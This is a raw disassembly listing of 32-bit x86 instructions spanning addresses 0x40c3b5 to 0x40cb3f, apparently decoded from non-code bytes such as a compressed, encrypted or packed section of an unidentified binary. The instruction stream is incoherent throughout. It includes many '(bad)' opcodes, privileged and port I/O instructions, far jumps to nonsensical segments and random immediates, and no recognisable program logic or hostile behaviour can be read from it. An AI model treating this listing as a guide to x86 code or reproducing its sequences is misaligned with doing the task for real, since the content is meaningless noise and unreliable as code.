  40c3b5:	inc    ebx
  40c3b6:	add    DWORD PTR [edi+0x163dd56d],ecx
  40c3bc:	sbb    DWORD PTR [eax],ebp
  40c3be:	daa    
  40c3bf:	lock xor DWORD PTR [ecx],ecx
  40c3c2:	das    
  40c3c3:	(bad)  
  40c3c4:	mov    edx,0x3e30e863
  40c3c9:	dec    ecx
  40c3ca:	or     DWORD PTR [ebx+esi*8+0x16],edx
  40c3ce:	sbb    DWORD PTR [edx+0x46a3ee1f],ecx
  40c3d4:	sbb    dl,cl
  40c3d6:	sar    BYTE PTR [ebx-0x5b78203d],0x79
  40c3dd:	inc    edi
  40c3de:	cmp    al,0x1d
  40c3e0:	clc    
  40c3e1:	cmc    
  40c3e2:	pop    edx
  40c3e3:	inc    eax
  40c3e4:	imul   ecx,eax,0x6fa962dc
  40c3ea:	xchg   edx,eax
  40c3eb:	jmp    0x40c44e
  40c3ed:	out    dx,al
  40c3ee:	and    cl,BYTE PTR [ebp+0x4d]
  40c3f1:	(bad)  
  40c3f2:	jnp    0x40c3a4
  40c3f4:	mov    bl,0x3d
  40c3f6:	pop    es
  40c3f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3f8:	and    DWORD PTR [ecx],eax
  40c3fa:	add    DWORD PTR [ecx],edx
  40c3fc:	hlt    
  40c3fd:	xor    BYTE PTR [edi+0x60279d96],bh
  40c403:	stos   BYTE PTR es:[edi],al
  40c404:	mov    DWORD PTR [ecx],esi
  40c406:	int3   
  40c407:	add    edi,esp
  40c409:	jmp    0x40c453
  40c40b:	shl    DWORD PTR [eax],cl
  40c40d:	test   DWORD PTR [edx-0x573c67c],esp
  40c413:	(bad)  
  40c414:	mov    al,0x8
  40c416:	pop    ecx
  40c417:	icebp  
  40c418:	test   DWORD PTR [edx+0x58],esp
  40c41b:	xchg   BYTE PTR [eax+0xe],cl
  40c41e:	inc    ebx
  40c41f:	jns    0x40c439
  40c421:	jmp    0x40c3f9
  40c423:	loope  0x40c3c8
  40c425:	fistp  DWORD PTR [edx+0x2a]
  40c428:	mov    al,ds:0x6a63167
  40c42d:	add    cl,BYTE PTR [esp+edi*1-0x6705bd72]
  40c434:	or     BYTE PTR [ebx],ah
  40c436:	sbb    DWORD PTR [esi-0x7c],esi
  40c439:	sahf   
  40c43a:	inc    edx
  40c43b:	popa   
  40c43c:	sti    
  40c43d:	push   edx
  40c43e:	push   edi
  40c43f:	mov    ebx,0xe5d93867
  40c444:	pop    edi
  40c445:	les    eax,FWORD PTR [esi]
  40c447:	mov    esp,DWORD PTR [edx+0x2bac116f]
  40c44d:	daa    
  40c44e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c44f:	jbe    0x40c4a0
  40c451:	daa    
  40c452:	inc    esp
  40c453:	and    ch,BYTE PTR [ebp+0x6e]
  40c456:	sbb    eax,0x831cd80a
  40c45b:	dec    edi
  40c45c:	jg     0x40c40e
  40c45e:	into   
  40c45f:	sbb    DWORD PTR [ebx],edx
  40c461:	addr16 int 0x51
  40c464:	scas   al,BYTE PTR es:[edi]
  40c465:	adc    eax,0x548fc204
  40c46a:	sub    eax,0x6570b397
  40c46f:	or     cl,BYTE PTR [edx+0x3b]
  40c472:	stos   BYTE PTR es:[edi],al
  40c473:	mov    bl,BYTE PTR [edx]
  40c475:	sub    esp,DWORD PTR [esp+edx*8-0x397bf481]
  40c47c:	fild   QWORD PTR [edx+0xb0f90b4]
  40c482:	aas    
  40c483:	adc    BYTE PTR [esi+0x2e],dl
  40c486:	cmp    ch,BYTE PTR ds:0xf6535f50
  40c48c:	outs   dx,BYTE PTR ds:[esi]
  40c48d:	push   ecx
  40c48e:	and    ch,dh
  40c490:	dec    ah
  40c492:	jbe    0x40c468
  40c494:	lock ret 0x2faa
  40c498:	mov    ecx,DWORD PTR [esi+edx*4-0xaa8386a]
  40c49f:	in     eax,0xc9
  40c4a1:	xor    DWORD PTR [edi+ebx*1+0x67],0x3b2fcf74
  40c4a9:	xchg   esi,eax
  40c4aa:	outs   dx,DWORD PTR ds:[esi]
  40c4ab:	sbb    ecx,DWORD PTR [ebx+edx*8]
  40c4ae:	enter  0x6ab7,0x52
  40c4b2:	jmp    0x40c4ed
  40c4b4:	add    al,0x7b
  40c4b6:	mov    eax,esi
  40c4b8:	jns    0x40c50b
  40c4ba:	cmp    BYTE PTR [eax+0x5c835c6a],dl
  40c4c0:	(bad)  
  40c4c1:	mov    bl,0xf0
  40c4c3:	push   ecx
  40c4c4:	ins    BYTE PTR es:[edi],dx
  40c4c5:	test   BYTE PTR [eax+0x2abc217],dh
  40c4cb:	enter  0x6e84,0x44
  40c4cf:	jp     0x40c474
  40c4d1:	cmp    eax,0x7d895bd8
  40c4d6:	(bad)  
  40c4d7:	iret   
  40c4d8:	bnd js 0x40c4f0
  40c4db:	(bad)  
  40c4dc:	je     0x40c530
  40c4de:	adc    al,0x98
  40c4e0:	push   0xca1d0742
  40c4e5:	mov    edx,0xf8f677c0
  40c4ea:	scas   al,BYTE PTR es:[edi]
  40c4eb:	bound  eax,QWORD PTR [ebx-0x5d417574]
  40c4f1:	xchg   esi,edx
  40c4f3:	xchg   edx,eax
  40c4f4:	add    BYTE PTR [ecx],bl
  40c4f6:	mov    al,ds:0xafb35b58
  40c4fb:	jmp    0x4a2c82e
  40c500:	jecxz  0x40c4d6
  40c502:	sub    DWORD PTR [eax-0x39],eax
  40c505:	pop    edi
  40c506:	pop    esi
  40c507:	pop    eax
  40c508:	in     al,0x73
  40c50a:	fsubr  DWORD PTR [ecx]
  40c50c:	je     0x40c4d5
  40c50e:	jp     0x40c4c2
  40c510:	dec    ebx
  40c511:	or     ebp,DWORD PTR [eax+0x37]
  40c514:	sub    esp,DWORD PTR [esi+0x72590013]
  40c51a:	inc    edi
  40c51b:	js     0x40c4d8
  40c51d:	cmp    al,0xae
  40c51f:	pusha  
  40c520:	and    al,0xda
  40c522:	cmp    BYTE PTR [esp+ecx*8-0x48b2ea19],0x24
  40c52a:	retf   0x4cee
  40c52d:	cmp    DWORD PTR [ebx],edx
  40c52f:	jecxz  0x40c556
  40c531:	iret   
  40c532:	push   edi
  40c533:	and    ch,cl
  40c535:	inc    edi
  40c536:	or     ch,BYTE PTR ds:0xf54ecd0b
  40c53c:	repz and DWORD PTR [ebx+0xf8969a7],0x23fa239f
  40c547:	or     BYTE PTR [edi+0x32597f34],0x86
  40c54e:	jg     0x40c587
  40c550:	sar    dh,1
  40c552:	jnp    0x40c54e
  40c554:	ss or  DWORD PTR es:[edi+0x7949b3a8],0x5fc452d6
  40c560:	push   ebp
  40c561:	cmp    ch,BYTE PTR [ebp-0xe]
  40c564:	shr    dl,1
  40c566:	out    dx,eax
  40c567:	into   
  40c568:	sbb    BYTE PTR [esi+0x4a1a12e7],0x6e
  40c56f:	scas   eax,DWORD PTR es:[edi]
  40c570:	add    BYTE PTR [ecx+ebp*1+0x71409cf5],bh
  40c577:	inc    edi
  40c578:	popf   
  40c579:	out    0x2b,eax
  40c57b:	dec    edi
  40c57c:	mov    bl,0x29
  40c57e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c57f:	xor    bl,ch
  40c581:	or     al,0x69
  40c583:	es mov ch,0xfc
  40c586:	jp     0x40c53a
  40c588:	nop
  40c589:	cmp    eax,0x432218e2
  40c58e:	test   al,0xc9
  40c590:	push   0x92793eba
  40c595:	dec    eax
  40c596:	mov    BYTE PTR [eax+0x1b81168e],ah
  40c59c:	rcr    ah,cl
  40c59e:	xlat   BYTE PTR gs:[ebx]
  40c5a0:	jmp    0x9fcc:0x8e114600
  40c5a7:	in     eax,0x9a
  40c5a9:	popf   
  40c5aa:	lods   eax,DWORD PTR ds:[esi]
  40c5ab:	mov    ebx,0x539cb420
  40c5b0:	loop   0x40c57b
  40c5b2:	pushw  es
  40c5b4:	push   esp
  40c5b5:	test   al,0xaa
  40c5b7:	mov    al,bl
  40c5b9:	and    BYTE PTR [esi],ah
  40c5bb:	sbb    esi,ecx
  40c5bd:	mov    bl,BYTE PTR [ebp-0x70ab2eca]
  40c5c3:	jmp    0x45f2:0x923bffd4
  40c5ca:	sbb    al,0xc2
  40c5cc:	ret    
  40c5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ce:	sub    al,0x33
  40c5d0:	mov    edx,0x6450619f
  40c5d5:	loopne 0x40c569
  40c5d7:	push   ebx
  40c5d8:	push   ebp
  40c5d9:	sbb    al,0x70
  40c5db:	mov    ebp,0xf1a0df9c
  40c5e0:	push   ecx
  40c5e1:	test   DWORD PTR [edx],edi
  40c5e3:	and    BYTE PTR [ebx-0x3c],ah
  40c5e6:	mov    BYTE PTR [edx+eiz*2],dl
  40c5e9:	xor    eax,0x477b855
  40c5ee:	sub    BYTE PTR [ebx+0x162e0b2d],bh
  40c5f4:	xor    ebp,esi
  40c5f6:	loop   0x40c624
  40c5f8:	inc    ebp
  40c5f9:	jge    0x40c5fe
  40c5fb:	fldcw  WORD PTR [esi+0x28732f30]
  40c601:	or     al,0xc2
  40c603:	in     al,dx
  40c604:	inc    ebx
  40c605:	test   DWORD PTR [ebp+0x51],ebp
  40c608:	jp     0x40c5df
  40c60a:	fld    QWORD PTR [edi]
  40c60c:	and    DWORD PTR [ebx+0x67],ecx
  40c60f:	lds    esp,FWORD PTR [ecx]
  40c611:	gs lahf 
  40c613:	adc    al,BYTE PTR [edx+0x52]
  40c616:	daa    
  40c617:	inc    edi
  40c618:	test   eax,0xa426cd8f
  40c61d:	xchg   edx,eax
  40c61e:	test   al,0x86
  40c620:	fs sub ch,ah
  40c623:	sbb    al,0x81
  40c625:	cmc    
  40c626:	bound  ecx,QWORD PTR [edi+0x4c]
  40c629:	aaa    
  40c62a:	ins    BYTE PTR es:[edi],dx
  40c62b:	sbb    BYTE PTR [ebx-0x5f],ch
  40c62e:	add    DWORD PTR [ecx-0x383f91c3],ebp
  40c634:	ja     0x40c63e
  40c636:	and    ecx,esi
  40c638:	mov    BYTE PTR [esp+edx*8],bh
  40c63b:	cs jge 0x40c634
  40c63e:	push   0xffffffc0
  40c640:	push   eax
  40c641:	jnp    0x40c6ba
  40c643:	repnz xor edi,DWORD PTR [esi]
  40c646:	mov    ebp,0x198af6c7
  40c64b:	jmp    0x5dcc4a78
  40c650:	push   es
  40c651:	add    BYTE PTR [esi],dh
  40c653:	retf   0x1b98
  40c656:	not    DWORD PTR [eax+eax*1]
  40c659:	stc    
  40c65a:	mov    ebp,0x45a077a5
  40c65f:	xor    ah,BYTE PTR [ecx+0x2371cdf2]
  40c665:	imul   ebp,DWORD PTR [eax],0x8bf1fcaf
  40c66b:	cmc    
  40c66c:	mov    bh,0x22
  40c66e:	xor    DWORD PTR [edx],esi
  40c670:	aam    0xb5
  40c672:	or     esp,ebp
  40c674:	jge    0x40c6a3
  40c676:	popf   
  40c677:	inc    edi
  40c678:	enter  0x746,0xa8
  40c67c:	divps  xmm0,XMMWORD PTR [ebp+0x5aaba2c5]
  40c683:	lds    ebp,FWORD PTR [edx]
  40c685:	mov    esp,ds
  40c687:	outs   dx,DWORD PTR ds:[esi]
  40c688:	loope  0x40c6fc
  40c68a:	cdq    
  40c68b:	mov    eax,ds:0xc3f63f31
  40c690:	mov    WORD PTR [edx],fs
  40c692:	cld    
  40c693:	sti    
  40c694:	xor    dl,BYTE PTR [edi-0x17]
  40c697:	inc    ebx
  40c698:	jnp    0x40c697
  40c69a:	and    ebp,edi
  40c69c:	pop    ss
  40c69d:	call   0x46a0fad7
  40c6a2:	inc    edx
  40c6a3:	(bad)  
  40c6a4:	clc    
  40c6a5:	ror    BYTE PTR [eax-0x25],0x39
  40c6a9:	or     DWORD PTR [esi],0x37
  40c6ac:	mov    ds:0x1c9e5641,al
  40c6b1:	cld    
  40c6b2:	xchg   ebp,eax
  40c6b3:	lock imul edi,esi,0x65
  40c6b7:	cmp    eax,0x5fd4ca97
  40c6bc:	aad    0x69
  40c6be:	sub    eax,0xcf316222
  40c6c3:	(bad)  
  40c6c4:	mov    WORD PTR [ebp+eax*2-0x2c],es
  40c6c8:	push   edx
  40c6c9:	jmp    FWORD PTR [ebx-0x4d]
  40c6cc:	xchg   edx,eax
  40c6cd:	(bad)  
  40c6ce:	mul    BYTE PTR [esp+edx*8-0x79]
  40c6d2:	adc    BYTE PTR [ebx-0x59],al
  40c6d5:	push   es
  40c6d6:	test   al,0x7b
  40c6d8:	aad    0xa7
  40c6da:	inc    edi
  40c6dc:	push   ds
  40c6dd:	or     al,0x22
  40c6df:	(bad)  
  40c6e0:	mov    dh,BYTE PTR [esp+eiz*4-0x70]
  40c6e4:	out    0x92,eax
  40c6e6:	and    eax,0x4dca3d19
  40c6eb:	xchg   esp,eax
  40c6ec:	je     0x40c6c5
  40c6ee:	js     0x40c6b6
  40c6f0:	rol    dl,1
  40c6f2:	lea    ebp,[edx-0x32f15c10]
  40c6f8:	cmovle eax,DWORD PTR ds:0xfce9059d
  40c6ff:	jnp    0x40c6f9
  40c701:	outs   dx,BYTE PTR ds:[esi]
  40c702:	jb     0x40c736
  40c704:	jmp    0xd130:0x8cf6b108
  40c70b:	sbb    eax,ecx
  40c70d:	mov    eax,0x3300b477
  40c712:	fmul   DWORD PTR [ebx+eax*2-0x68]
  40c716:	out    0xdd,eax
  40c718:	adc    BYTE PTR [esi-0x64],bh
  40c71b:	mov    ebx,0xee87343f
  40c720:	dec    ebp
  40c721:	push   ebx
  40c722:	dec    edx
  40c723:	xor    ebx,ebp
  40c725:	mov    dh,0x7d
  40c727:	xor    DWORD PTR [ecx+0x4b969e6f],0xc8c90430
  40c731:	les    edi,FWORD PTR [ecx-0x325a407f]
  40c737:	loopne 0x40c6f0
  40c739:	imul   ecx,DWORD PTR [edi-0x1c4e8841],0xdad4877b
  40c743:	(bad)  
  40c744:	cwde   
  40c745:	scas   eax,DWORD PTR es:[edi]
  40c746:	adc    DWORD PTR [edi+0x6c],esi
  40c749:	lahf   
  40c74a:	mov    bl,0xea
  40c74c:	fdiv   st,st(6)
  40c74e:	call   0xe19a:0x5e742c49
  40c755:	vpavgb xmm5,xmm0,XMMWORD PTR [bx+di]
  40c75a:	scas   eax,DWORD PTR es:[edi]
  40c75b:	in     al,0x9a
  40c75d:	xor    eax,0x22c38669
  40c762:	daa    
  40c763:	pop    ecx
  40c764:	cmp    eax,0xcc6fafcd
  40c769:	hlt    
  40c76a:	test   BYTE PTR [ecx],al
  40c76c:	xor    BYTE PTR [edi],cl
  40c76e:	ins    WORD PTR es:[edi],dx
  40c770:	into   
  40c771:	bound  esi,QWORD PTR [edx+eiz*4-0x13]
  40c775:	jb     0x740eb8bb
  40c77b:	sbb    al,0xf9
  40c77d:	fdivr  QWORD PTR [edx]
  40c77f:	(bad)  [edi]
  40c781:	das    
  40c782:	cmp    dl,BYTE PTR [eax-0x7b5b90a1]
  40c788:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40c78a:	pop    ebp
  40c78b:	mov    bh,0x4d
  40c78d:	adc    BYTE PTR [ecx+0x4b2bf74d],bl
  40c793:	or     DWORD PTR [ebp+ebp*1-0x3f],ebx
  40c797:	test   DWORD PTR [edx],ebx
  40c799:	fisub  WORD PTR [edx]
  40c79b:	inc    BYTE PTR [ebx+0x34]
  40c79e:	jmp    0x3271:0x7c1c9809
  40c7a5:	sar    cl,cl
  40c7a7:	popa   
  40c7a8:	and    BYTE PTR [ecx+ecx*4+0x73],dh
  40c7ac:	shr    BYTE PTR [edi+0x3c95ff51],0xa6
  40c7b3:	ds cmc 
  40c7b5:	ds retf 0xcffd
  40c7b9:	scas   al,BYTE PTR es:[edi]
  40c7ba:	adc    eax,0x542d8ab
  40c7bf:	cmp    al,0x8
  40c7c1:	cmp    DWORD PTR [eax+0x4f],eax
  40c7c4:	pcmpgtb mm5,QWORD PTR [ecx]
  40c7c7:	pop    edi
  40c7c8:	sub    al,0x62
  40c7ca:	out    0x5d,al
  40c7cc:	pop    es
  40c7cd:	cmp    ebx,0xea6a1dc1
  40c7d3:	and    DWORD PTR [edx],ebx
  40c7d5:	fdivr  st(6),st
  40c7d7:	aam    0x4d
  40c7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7da:	cs (bad) 
  40c7dc:	fst    QWORD PTR ds:[ebx]
  40c7df:	into   
  40c7e0:	cwde   
  40c7e1:	adc    cl,0xdb
  40c7e4:	pop    ds
  40c7e5:	jp     0x40c83a
  40c7e7:	not    BYTE PTR ds:[ebx+0x49a65d1a]
  40c7ee:	pop    edi
  40c7ef:	lea    ebx,[ecx+eax*1-0x284151ca]
  40c7f6:	pop    ss
  40c7f7:	cld    
  40c7f8:	pop    ss
  40c7f9:	adc    cl,dh
  40c7fb:	es ds repnz xchg ecx,eax
  40c7ff:	sti    
  40c800:	mov    ebp,0xe7fd09b3
  40c805:	jno    0x40c882
  40c807:	dec    ecx
  40c808:	call   0xb78a019f
  40c80d:	xor    al,0x6f
  40c80f:	jp     0x40c839
  40c811:	mov    al,ds:0x55007098
  40c816:	clc    
  40c817:	pop    edx
  40c818:	(bad)  
  40c819:	push   edx
  40c81a:	mov    eax,0x7dd7b0bc
  40c81f:	call   0x9076:0xbabc99d0
  40c826:	jecxz  0x40c7ae
  40c828:	aaa    
  40c829:	jne    0x40c837
  40c82b:	cmp    BYTE PTR [edx],al
  40c82d:	shl    BYTE PTR [edx+0x36c74298],1
  40c833:	push   ss
  40c834:	dec    esi
  40c835:	int    0xaf
  40c837:	(bad)  
  40c838:	scas   al,BYTE PTR es:[edi]
  40c839:	pop    edx
  40c83a:	sbb    eax,0xdf71c2ad
  40c83f:	sub    edx,esp
  40c841:	loopne 0x40c867
  40c843:	push   ecx
  40c844:	push   ds
  40c845:	je     0x40c86f
  40c847:	shl    BYTE PTR [edi+ebp*1+0xeb8b616],1
  40c84e:	test   al,0x3d
  40c850:	sbb    DWORD PTR [eax],esi
  40c852:	scas   al,BYTE PTR es:[edi]
  40c853:	fcmovne st,st(5)
  40c855:	ja     0x40c7f6
  40c857:	xchg   esi,eax
  40c858:	(bad)  [edx]
  40c85a:	test   DWORD PTR [esi+0x44683c51],edx
  40c860:	fyl2x  
  40c862:	leave  
  40c863:	cld    
  40c864:	mov    cl,0xd5
  40c866:	mov    ?,WORD PTR [ecx+0x37]
  40c869:	dec    ebp
  40c86a:	mov    al,ds:0xafacce0a
  40c86f:	dec    eax
  40c870:	nop
  40c871:	cmc    
  40c872:	mov    esp,0x431c1a78
  40c877:	sbb    eax,0xe8de0809
  40c87c:	inc    esp
  40c87d:	iret   
  40c87e:	add    eax,0x98fe120a
  40c883:	lds    edi,FWORD PTR [edx+0x69a689b4]
  40c889:	aaa    
  40c88a:	dec    edx
  40c88b:	dec    ebp
  40c88c:	jmp    0x991bf52a
  40c891:	push   edi
  40c892:	xchg   edx,esp
  40c894:	les    eax,FWORD PTR [eax+0x17]
  40c897:	iret   
  40c898:	pop    ebp
  40c899:	xchg   DWORD PTR [esi],ebp
  40c89b:	xor    esp,DWORD PTR [eax]
  40c89d:	pushf  
  40c89e:	fisub  WORD PTR [edi]
  40c8a0:	sbb    eax,0xc6dfd5e3
  40c8a5:	mov    al,0xf3
  40c8a7:	cmp    BYTE PTR [edx],bh
  40c8a9:	out    dx,eax
  40c8aa:	add    ah,BYTE PTR [ebx-0xf]
  40c8ad:	addr16 pop edi
  40c8af:	ins    BYTE PTR es:[edi],dx
  40c8b0:	pop    ss
  40c8b1:	fbld   TBYTE PTR [edi]
  40c8b3:	sub    bh,BYTE PTR [ecx-0x7cb2a007]
  40c8b9:	lea    esi,[ebx-0x45965195]
  40c8bf:	(bad)  
  40c8c0:	xchg   ebp,eax
  40c8c1:	push   0xffffffc8
  40c8c3:	xlat   BYTE PTR ds:[ebx]
  40c8c4:	mov    bh,0xe6
  40c8c6:	test   al,0xd1
  40c8c8:	sahf   
  40c8c9:	jo     0x40c890
  40c8cb:	add    bh,BYTE PTR [ebp-0x7f]
  40c8ce:	rcl    ebp,cl
  40c8d0:	mov    bh,0x98
  40c8d2:	(bad)  
  40c8d3:	push   edx
  40c8d4:	in     eax,0xc
  40c8d6:	mov    esi,0xc1978b55
  40c8db:	inc    ebp
  40c8dc:	push   ecx
  40c8dd:	(bad)  
  40c8de:	imul   ch
  40c8e0:	(bad)  
  40c8e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8e2:	or     eax,0x909477a4
  40c8e7:	jns    0x40c8b1
  40c8e9:	cld    
  40c8ea:	rcr    DWORD PTR [esi+0xc],0xe9
  40c8ee:	es mov cs,ecx
  40c8f1:	jg     0x40c92f
  40c8f3:	jne    0x40c8e0
  40c8f5:	outs   dx,BYTE PTR ds:[esi]
  40c8f6:	ret    
  40c8f7:	push   ebp
  40c8f8:	mov    esp,0xa33d52c1
  40c8fd:	mov    edi,0x13d60f4d
  40c902:	or     ebx,ecx
  40c904:	shl    BYTE PTR [eax],cl
  40c906:	or     eax,ecx
  40c908:	sub    cl,BYTE PTR [ebx]
  40c90a:	mov    ebp,0x49adfa77
  40c90f:	dec    edi
  40c910:	jg     0x40c940
  40c912:	retf   0x5046
  40c915:	cli    
  40c916:	sub    dh,bh
  40c918:	aaa    
  40c919:	dec    eax
  40c91a:	idiv   DWORD PTR [edi-0x27]
  40c91d:	imul   BYTE PTR [ebx]
  40c91f:	mov    edi,0x12b374cb
  40c924:	and    DWORD PTR [edx+0x440c8dfb],eax
  40c92a:	test   al,0xd9
  40c92c:	mov    bl,BYTE PTR [ecx+eax*2-0x7f800142]
  40c933:	repz int 0xdc
  40c936:	and    edi,DWORD PTR [edx+0x58]
  40c939:	imul   esi,DWORD PTR [edi],0xffffffd7
  40c93c:	icebp  
  40c93d:	or     al,0xbe
  40c93f:	sub    al,0xd7
  40c941:	int    0xf4
  40c943:	pop    ebp
  40c944:	adc    BYTE PTR [ebp+esi*8-0x57],0xdb
  40c949:	xchg   esp,eax
  40c94a:	jns    0x40c98d
  40c94c:	push   ebx
  40c94d:	dec    ebp
  40c94e:	push   ebx
  40c94f:	je     0x40c992
  40c951:	stos   DWORD PTR es:[edi],eax
  40c952:	mov    cs,WORD PTR [ebx+edi*2-0x3f1b2db3]
  40c959:	push   edi
  40c95a:	lods   al,BYTE PTR ds:[esi]
  40c95b:	inc    esi
  40c95c:	push   0x37932a2c
  40c961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c962:	popf   
  40c963:	mov    edx,0xa840167b
  40c968:	inc    esi
  40c969:	adc    eax,0x4a0f85cd
  40c96e:	test   DWORD PTR [edx-0x615110ca],edx
  40c974:	aam    0x3b
  40c976:	retf   0x17b0
  40c979:	cwde   
  40c97a:	sti    
  40c97b:	sub    edx,ecx
  40c97d:	mov    edi,0x94c2797c
  40c982:	scas   al,BYTE PTR es:[edi]
  40c983:	popa   
  40c984:	pop    ebp
  40c985:	pop    ebx
  40c986:	adc    DWORD PTR [esi-0x1da17780],eax
  40c98c:	mov    cl,0xa2
  40c98e:	xor    eax,0x51671ba6
  40c993:	hlt    
  40c994:	and    al,0x90
  40c996:	mov    al,ds:0xf58d9fdd
  40c99b:	test   DWORD PTR [edi+0x372ae247],edi
  40c9a1:	pop    ecx
  40c9a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9a4:	push   ebx
  40c9a5:	mov    edx,0xa007122d
  40c9aa:	je     0x40c9b5
  40c9ac:	xor    BYTE PTR [esi-0x5b42f8f9],al
  40c9b2:	cs fs push 0xffffff8a
  40c9b6:	fucomp st(2)
  40c9b8:	adc    DWORD PTR [eax],esp
  40c9ba:	xor    al,0x78
  40c9bc:	push   edx
  40c9bd:	fstp   DWORD PTR [esi-0x7bb87236]
  40c9c3:	aad    0x0
  40c9c5:	add    eax,0x59ecc056
  40c9ca:	sub    ebp,ebp
  40c9cc:	cli    
  40c9cd:	in     al,0xd1
  40c9cf:	inc    edx
  40c9d0:	sahf   
  40c9d1:	mov    ds:0x1a6f2213,eax
  40c9d6:	adc    eax,0xe2045ad6
  40c9db:	stc    
  40c9dc:	outs   dx,BYTE PTR ds:[esi]
  40c9dd:	mov    bl,0x6b
  40c9df:	test   DWORD PTR [ebp-0x44],esp
  40c9e2:	or     BYTE PTR [esi],al
  40c9e4:	jno    0x40c9a9
  40c9e6:	xchg   DWORD PTR [ecx-0x4e],esi
  40c9e9:	push   ebp
  40c9ea:	int3   
  40c9eb:	mov    edi,0xe2efc950
  40c9f0:	sub    BYTE PTR [ecx+0x49586635],ch
  40c9f6:	ret    
  40c9f7:	shr    BYTE PTR [ecx],1
  40c9f9:	and    eax,0x329c53b8
  40c9fe:	jl     0x40ca0e
  40ca00:	or     BYTE PTR fs:[ecx],ch
  40ca03:	mov    bl,0xb9
  40ca05:	hlt    
  40ca06:	cmp    dh,BYTE PTR [edx+ebx*8+0x2ae6d543]
  40ca0d:	iret   
  40ca0e:	xchg   ch,dl
  40ca10:	push   ebx
  40ca11:	jbe    0x40c9e3
  40ca13:	jge    0x40ca40
  40ca15:	inc    BYTE PTR [eax+0x56548930]
  40ca1b:	int3   
  40ca1c:	and    BYTE PTR [edi+0x7d477393],cl
  40ca22:	ds push cs
  40ca24:	add    esi,esi
  40ca26:	pop    edx
  40ca27:	jae    0x40ca6a
  40ca29:	add    DWORD PTR [ecx],ebp
  40ca2b:	pop    ebx
  40ca2c:	fbld   TBYTE PTR [ecx-0x2e667b82]
  40ca32:	jge    0x40ca15
  40ca34:	xchg   ebp,eax
  40ca35:	aad    0x63
  40ca37:	sbb    DWORD PTR [eax],esp
  40ca39:	add    eax,0xdc8cb9ec
  40ca3e:	popf   
  40ca3f:	sub    eax,0x5c9da584
  40ca44:	into   
  40ca45:	mov    ds:0xe9f95fc2,al
  40ca4a:	lock outs dx,DWORD PTR ds:[esi]
  40ca4c:	push   0x52f3b4d0
  40ca51:	pop    esp
  40ca52:	ss jae 0x40ca5f
  40ca55:	int    0xa5
  40ca57:	cdq    
  40ca58:	ffreep st(3)
  40ca5a:	and    DWORD PTR [ecx+0x8918bc4],esi
  40ca60:	xchg   al,dh
  40ca62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca63:	lock das 
  40ca65:	xor    esi,DWORD PTR [ecx+eax*2+0x7ffee3b]
  40ca6c:	and    al,0xb9
  40ca6e:	push   ecx
  40ca6f:	arpl   WORD PTR [esi],ax
  40ca71:	into   
  40ca72:	and    eax,0xa6572d46
  40ca77:	bnd jge 0x40ca99
  40ca7a:	sub    eax,DWORD PTR [ebp+0x582bec8f]
  40ca80:	out    dx,al
  40ca81:	add    DWORD PTR [eax],esp
  40ca83:	cmp    BYTE PTR [ecx],bl
  40ca85:	dec    ecx
  40ca86:	pop    esp
  40ca87:	sub    ch,ch
  40ca89:	je     0x40cac5
  40ca8b:	pop    ds
  40ca8c:	adc    cl,BYTE PTR [esi+0x5c]
  40ca8f:	dec    ecx
  40ca90:	inc    edi
  40ca91:	les    ecx,FWORD PTR [esi+eax*4+0x30]
  40ca95:	das    
  40ca96:	int    0xcb
  40ca98:	push   es
  40ca99:	mov    ds:0x690e64b0,al
  40ca9e:	ja     0x40cb06
  40caa0:	xor    al,0xf1
  40caa2:	out    0x51,al
  40caa4:	stc    
  40caa5:	test   BYTE PTR [eax-0x4decd9df],bh
  40caab:	mov    esi,0x7607cdc0
  40cab0:	mov    DWORD PTR [ebx+ebp*8+0x637ebe2f],0x80a5c330
  40cabb:	out    dx,al
  40cabc:	fcomi  st,st(2)
  40cabe:	test   eax,0x39928565
  40cac3:	out    dx,al
  40cac4:	mov    eax,0xd2e744cc
  40cac9:	xor    BYTE PTR [edx-0x75d13876],dl
  40cacf:	dec    eax
  40cad0:	retf   0x11b4
  40cad3:	cmp    eax,esi
  40cad5:	push   es
  40cad6:	add    bl,dl
  40cad8:	xchg   ecx,eax
  40cad9:	lds    esp,FWORD PTR [eax+eax*4]
  40cadc:	jae    0x40cade
  40cade:	out    0x75,eax
  40cae0:	sub    ch,BYTE PTR [edi-0x60]
  40cae3:	leave  
  40cae4:	pusha  
  40cae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae6:	dec    esi
  40cae7:	and    eax,0x94c79885
  40caec:	pop    ds
  40caed:	mov    bl,BYTE PTR [esi-0x3f9a92b3]
  40caf3:	add    cl,dh
  40caf5:	jo     0x40cb31
  40caf7:	inc    esi
  40caf8:	sbb    eax,0xf9f0d485
  40cafd:	pop    eax
  40cafe:	inc    esp
  40caff:	or     esi,esp
  40cb01:	ret    0xb0d0
  40cb04:	fst    DWORD PTR [edx-0x529e8f6c]
  40cb0a:	cli    
  40cb0b:	inc    eax
  40cb0c:	mov    BYTE PTR [ecx-0x35],bh
  40cb0f:	scas   al,BYTE PTR es:[edi]
  40cb10:	add    bl,al
  40cb12:	mov    edi,0x9763605
  40cb17:	mov    ebp,0xbff8541
  40cb1c:	sub    esp,eax
  40cb1e:	push   ss
  40cb1f:	inc    edi
  40cb20:	xchg   edx,eax
  40cb21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb22:	fcmovb st,st(5)
  40cb24:	sbb    al,0x71
  40cb26:	xchg   edx,eax
  40cb27:	imul   edx,DWORD PTR [ecx],0x52d4d525
  40cb2d:	dec    eax
  40cb2e:	add    bl,BYTE PTR [ecx-0xa]
  40cb31:	push   esi
  40cb32:	jbe    0x40cb1e
  40cb34:	dec    ebx
  40cb35:	add    BYTE PTR [ebx+edx*2-0x44cc7899],ch
  40cb3c:	sti    
  40cb3d:	jno    0x40caf7
  40cb3f:	adc    DWORD PTR [eax-0x47],0xffffff84
